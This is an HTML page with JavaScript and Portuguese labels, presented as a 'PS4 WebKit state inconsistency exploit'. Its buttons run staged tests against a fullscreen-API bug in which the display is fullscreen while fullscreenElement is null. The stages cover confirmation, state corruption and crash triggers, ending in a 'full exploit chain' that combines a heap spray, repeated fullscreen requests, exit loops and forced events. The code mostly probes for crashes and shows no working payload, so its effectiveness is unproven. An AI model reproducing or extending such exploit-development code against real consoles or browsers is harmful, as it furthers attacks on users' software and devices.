<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - State Inconsistency Exploit</title>
</head>
<body>

<h1>PS4 WebKit - Fullscreen State Inconsistency</h1>

<p><strong>BUG:</strong> Visual fullscreen ativo MAS fullscreenElement = null</p>
<p><strong>OBJETIVO:</strong> Explorar estado inconsistente</p>

<h2>Fase 1: Confirmação do Bug</h2>

<button onclick="test1_confirm()">1.1: Confirmar Inconsistência</button><br>
<button onclick="test1_check()">1.2: Verificar Estado Completo</button><br>
<button onclick="test1_apis()">1.3: Testar Todas as APIs</button><br>

<h2>Fase 2: Explorar Inconsistência</h2>

<button onclick="test2_recreate()">2.1: Recriar Elemento Após Null</button><br>
<button onclick="test2_new_fullscreen()">2.2: Novo Fullscreen com Estado Null</button><br>
<button onclick="test2_force_exit()">2.3: Forçar Exit com Estado Null</button><br>
<button onclick="test2_events()">2.4: Disparar Eventos em Estado Null</button><br>
<button onclick="test2_document_props()">2.5: Modificar Document Properties</button><br>

<h2>Fase 3: Corrupção via Estado Inconsistente</h2>

<button onclick="test3_double_request()">3.1: Fullscreen Request com Estado Null</button><br>
<button onclick="test3_element_swap()">3.2: Trocar Elemento Durante Null</button><br>
<button onclick="test3_rapid_toggle()">3.3: Toggle Rápido Null/Not-Null</button><br>
<button onclick="test3_nested_inconsistency()">3.4: Nested Inconsistency</button><br>
<button onclick="test3_memory_pressure()">3.5: Memory Pressure + Null State</button><br>

<h2>Fase 4: Crash Triggers</h2>

<button onclick="test4_exit_null()">4.1: exitFullscreen() em Estado Null</button><br>
<button onclick="test4_change_event()">4.2: fullscreenchange com Null</button><br>
<button onclick="test4_error_event()">4.3: fullscreenerror com Null</button><br>
<button onclick="test4_getters()">4.4: Testar Getters Internos</button><br>
<button onclick="test4_exploit_chain()">4.5: Full Exploit Chain</button><br>

<h2>Controles</h2>
<button onclick="clearLog()">Limpar Log</button>
<button onclick="saveState()">Salvar Estado</button>

<h2>Log</h2>
<pre id="log"></pre>

<div id="target">Target Element</div>

<script>
let bugState = {
    visualFullscreen: false,
    apiFullscreen: false,
    inconsistent: false,
    tests: []
};

function log(msg, type = 'info') {
    const logEl = document.getElementById('log');
    const ts = new Date().toLocaleTimeString();
    const types = {
        'info': '[INFO]',
        'bug': '[BUG]',
        'crash': '[CRASH]',
        'exploit': '[EXPLOIT]',
        'success': '[SUCCESS]'
    };
    logEl.textContent += `[${ts}] ${types[type]} ${msg}\n`;
    logEl.scrollTop = logEl.scrollHeight;
}

function clearLog() {
    document.getElementById('log').textContent = '';
}

function saveState() {
    localStorage.setItem('ps4_state_bug', JSON.stringify(bugState));
    log('Estado salvo!', 'success');
}

async function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}

async function createInconsistency() {
    await document.documentElement.requestFullscreen();
    await sleep(100);
    alert('Estado inconsistente criado');
    await sleep(100);
}

// ============================================
// FASE 1: CONFIRMAÇÃO
// ============================================

async function test1_confirm() {
    log('=== FASE 1.1: Confirmar Inconsistência ===', 'bug');
    
    await createInconsistency();
    
    log('Verificando estado...', 'info');
    
    // Verificar visual
    const isVisualFullscreen = (window.innerHeight === screen.height);
    log('Visual fullscreen: ' + isVisualFullscreen, 'info');
    
    // Verificar API
    const apiElement = document.fullscreenElement;
    log('document.fullscreenElement: ' + apiElement, 'bug');
    
    // Verificar inconsistência
    if (isVisualFullscreen && apiElement === null) {
        log('BUG CONFIRMADO: Estado inconsistente!', 'bug');
        log('Visual: FULLSCREEN | API: NULL', 'bug');
        bugState.inconsistent = true;
        saveState();
    }
}

async function test1_check() {
    log('=== FASE 1.2: Verificar Estado Completo ===', 'info');
    
    await createInconsistency();
    
    log('Checando todas as propriedades...', 'info');
    
    const state = {
        fullscreenElement: document.fullscreenElement,
        fullscreenEnabled: document.fullscreenEnabled,
        innerHeight: window.innerHeight,
        screenHeight: screen.height,
        outerHeight: window.outerHeight
    };
    
    log('Estado completo:', 'info');
    Object.entries(state).forEach(([key, value]) => {
        log('  ' + key + ': ' + value, 'info');
    });
    
    bugState.tests.push({test: 'state_check', state});
    saveState();
}

async function test1_apis() {
    log('=== FASE 1.3: Testar Todas as APIs ===', 'info');
    
    await createInconsistency();
    
    const apis = [
        () => document.fullscreenElement,
        () => document.fullscreenEnabled,
        () => document.exitFullscreen,
        () => document.documentElement.requestFullscreen
    ];
    
    apis.forEach((api, i) => {
        try {
            const result = api();
            log('API ' + i + ': ' + result, 'info');
        } catch(e) {
            log('API ' + i + ' erro: ' + e.message, 'crash');
        }
    });
}

// ============================================
// FASE 2: EXPLORAR INCONSISTÊNCIA
// ============================================

async function test2_recreate() {
    log('=== FASE 2.1: Recriar Elemento ===', 'exploit');
    
    await createInconsistency();
    
    log('fullscreenElement antes: ' + document.fullscreenElement, 'info');
    
    // Criar novo elemento com mesmo ID
    const newDiv = document.createElement('div');
    newDiv.id = 'fullscreen-fake';
    document.body.appendChild(newDiv);
    
    log('Novo elemento criado', 'info');
    log('fullscreenElement depois: ' + document.fullscreenElement, 'bug');
    
    // Tentar fazer fullscreen no novo elemento
    try {
        await newDiv.requestFullscreen();
        log('Novo fullscreen solicitado', 'exploit');
    } catch(e) {
        log('Erro: ' + e.message, 'crash');
    }
}

async function test2_new_fullscreen() {
    log('=== FASE 2.2: Novo Fullscreen com Null ===', 'exploit');
    
    await createInconsistency();
    
    log('Estado: Visual=FULL, API=null', 'bug');
    
    // Tentar OUTRO fullscreen enquanto null
    try {
        log('Solicitando novo fullscreen...', 'info');
        await document.documentElement.requestFullscreen();
        log('Segundo fullscreen aceito!', 'exploit');
        
        await sleep(100);
        log('fullscreenElement agora: ' + document.fullscreenElement, 'bug');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test2_force_exit() {
    log('=== FASE 2.3: Forçar Exit com Null ===', 'exploit');
    
    await createInconsistency();
    
    log('Estado null - tentando exit...', 'info');
    
    try {
        await document.exitFullscreen();
        log('exitFullscreen() executado', 'info');
        
        await sleep(500);
        
        const still = (window.innerHeight === screen.height);
        log('Ainda em fullscreen visual: ' + still, 'bug');
        
        if (still) {
            log('BUG: exitFullscreen() ignorado!', 'bug');
        }
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test2_events() {
    log('=== FASE 2.4: Eventos em Estado Null ===', 'exploit');
    
    // Event listeners
    document.addEventListener('fullscreenchange', () => {
        log('fullscreenchange disparado!', 'bug');
        log('  fullscreenElement: ' + document.fullscreenElement, 'bug');
    });
    
    document.addEventListener('fullscreenerror', () => {
        log('fullscreenerror disparado!', 'bug');
    });
    
    await createInconsistency();
    
    log('Disparando eventos customizados...', 'info');
    
    const event = new Event('fullscreenchange');
    document.dispatchEvent(event);
    
    await sleep(500);
}

async function test2_document_props() {
    log('=== FASE 2.5: Modificar Document Props ===', 'exploit');
    
    await createInconsistency();
    
    try {
        log('Tentando modificar propriedades...', 'info');
        
        // Tentar forçar fullscreenElement
        Object.defineProperty(document, 'fullscreenElement', {
            value: document.body,
            writable: true
        });
        
        log('Propriedade modificada!', 'exploit');
        log('fullscreenElement agora: ' + document.fullscreenElement, 'bug');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

// ============================================
// FASE 3: CORRUPÇÃO
// ============================================

async function test3_double_request() {
    log('=== FASE 3.1: Double Fullscreen Request ===', 'exploit');
    
    await createInconsistency();
    
    log('Estado null - double request...', 'info');
    
    try {
        // Duas solicitações rápidas
        const p1 = document.documentElement.requestFullscreen();
        const p2 = document.documentElement.requestFullscreen();
        
        await Promise.all([p1, p2]);
        
        log('Double request completo', 'info');
        log('fullscreenElement: ' + document.fullscreenElement, 'bug');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test3_element_swap() {
    log('=== FASE 3.2: Element Swap ===', 'exploit');
    
    const div1 = document.getElementById('target');
    const div2 = document.createElement('div');
    document.body.appendChild(div2);
    
    await createInconsistency();
    
    try {
        log('Fullscreen em div1...', 'info');
        await div1.requestFullscreen();
        
        await sleep(100);
        
        log('Fullscreen em div2...', 'info');
        await div2.requestFullscreen();
        
        log('Swap completo', 'info');
        log('fullscreenElement: ' + (document.fullscreenElement ? document.fullscreenElement.tagName : 'null'), 'bug');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test3_rapid_toggle() {
    log('=== FASE 3.3: Rapid Toggle ===', 'exploit');
    
    try {
        for (let i = 0; i < 10; i++) {
            log('Toggle ' + (i+1) + '/10...', 'info');
            
            await document.documentElement.requestFullscreen();
            await sleep(50);
            alert('Toggle ' + (i+1));
            
            log('  fullscreenElement: ' + document.fullscreenElement, 'bug');
            
            try {
                await document.exitFullscreen();
            } catch(e) {}
            
            await sleep(50);
        }
        
        log('Rapid toggle completo', 'info');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test3_nested_inconsistency() {
    log('=== FASE 3.4: Nested Inconsistency ===', 'exploit');
    
    await createInconsistency();
    log('Primeira inconsistência criada', 'bug');
    
    // Tentar criar segunda inconsistência
    try {
        await document.documentElement.requestFullscreen();
        await sleep(100);
        alert('Nested inconsistency');
        
        log('Segunda inconsistência tentada', 'bug');
        log('fullscreenElement: ' + document.fullscreenElement, 'bug');
        
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

async function test3_memory_pressure() {
    log('=== FASE 3.5: Memory Pressure + Null ===', 'exploit');
    
    await createInconsistency();
    
    log('Criando memory pressure...', 'info');
    
    const arrays = [];
    for (let i = 0; i < 200; i++) {
        arrays.push(new Array(10000).fill('X'.repeat(1000)));
    }
    
    log('Memory pressure criada com estado null', 'bug');
    
    try {
        await document.exitFullscreen();
        log('Exit com memory pressure', 'info');
    } catch(e) {
        log('CRASH: ' + e.message, 'crash');
        saveState();
    }
}

// ============================================
// FASE 4: CRASH TRIGGERS
// ============================================

async function test4_exit_null() {
    log('=== FASE 4.1: exitFullscreen() Loop ===', 'exploit');
    
    await createInconsistency();
    
    log('Tentando exit 100x com estado null...', 'info');
    
    for (let i = 0; i < 100; i++) {
        try {
            await document.exitFullscreen();
            log('Exit ' + (i+1) + ' executado', 'info');
        } catch(e) {
            log('CRASH em exit ' + (i+1) + ': ' + e.message, 'crash');
            saveState();
            break;
        }
    }
}

async function test4_change_event() {
    log('=== FASE 4.2: fullscreenchange Loop ===', 'exploit');
    
    let eventCount = 0;
    
    document.addEventListener('fullscreenchange', function handler() {
        eventCount++;
        log('fullscreenchange #' + eventCount, 'bug');
        log('  fullscreenElement: ' + document.fullscreenElement, 'bug');
        
        if (eventCount >= 10) {
            document.removeEventListener('fullscreenchange', handler);
        }
    });
    
    await createInconsistency();
    
    // Tentar disparar evento manualmente
    for (let i = 0; i < 10; i++) {
        const evt = new Event('fullscreenchange');
        document.dispatchEvent(evt);
        await sleep(100);
    }
}

async function test4_error_event() {
    log('=== FASE 4.3: fullscreenerror Trigger ===', 'exploit');
    
    document.addEventListener('fullscreenerror', (e) => {
        log('fullscreenerror disparado!', 'bug');
    });
    
    await createInconsistency();
    
    // Tentar forçar erro
    try {
        const iframe = document.createElement('iframe');
        document.body.appendChild(iframe);
        await iframe.requestFullscreen();
    } catch(e) {
        log('Erro forçado: ' + e.message, 'crash');
    }
}

async function test4_getters() {
    log('=== FASE 4.4: Test Internal Getters ===', 'exploit');
    
    await createInconsistency();
    
    const props = [
        'fullscreenElement',
        'fullscreenEnabled',
        'onfullscreenchange',
        'onfullscreenerror'
    ];
    
    props.forEach(prop => {
        try {
            const desc = Object.getOwnPropertyDescriptor(Document.prototype, prop);
            log(prop + ' getter: ' + (desc ? 'EXISTS' : 'null'), 'info');
            
            if (desc && desc.get) {
                const value = desc.get.call(document);
                log(prop + ' value: ' + value, 'bug');
            }
        } catch(e) {
            log(prop + ' CRASH: ' + e.message, 'crash');
        }
    });
}

async function test4_exploit_chain() {
    log('=== FASE 4.5: Full Exploit Chain ===', 'exploit');
    
    try {
        // 1. Create inconsistency
        await createInconsistency();
        log('[1] Inconsistência criada', 'exploit');
        
        // 2. Memory pressure
        const spray = [];
        for (let i = 0; i < 500; i++) {
            spray.push({marker: 0x41414141, data: new Uint8Array(256)});
        }
        log('[2] Heap spray criado', 'exploit');
        
        // 3. Try double fullscreen
        await document.documentElement.requestFullscreen();
        log('[3] Double fullscreen tentado', 'exploit');
        
        // 4. Force exit loop
        for (let i = 0; i < 50; i++) {
            await document.exitFullscreen();
        }
        log('[4] Exit loop completo', 'exploit');
        
        // 5. Trigger events
        document.dispatchEvent(new Event('fullscreenchange'));
        log('[5] Eventos disparados', 'exploit');
        
        log('EXPLOIT CHAIN COMPLETO!', 'exploit');
        
    } catch(e) {
        log('CRASH NO EXPLOIT CHAIN: ' + e.message, 'crash');
        saveState();
    }
}

// ============================================
// INIT
// ============================================
log('PS4 WebKit - State Inconsistency Exploit');
log('BUG: Visual fullscreen ativo, API retorna null');
log('');
log('Execute testes em ordem para explorar inconsistência');
log('');

// Restaurar estado anterior se existir
const saved = localStorage.getItem('ps4_state_bug');
if (saved) {
    bugState = JSON.parse(saved);
    log('Estado anterior restaurado:', 'info');
    log('  Inconsistente: ' + bugState.inconsistent, 'bug');
    log('  Testes: ' + bugState.tests.length, 'info');
}

log('Pronto!', 'success');
</script>

</body>
</html>
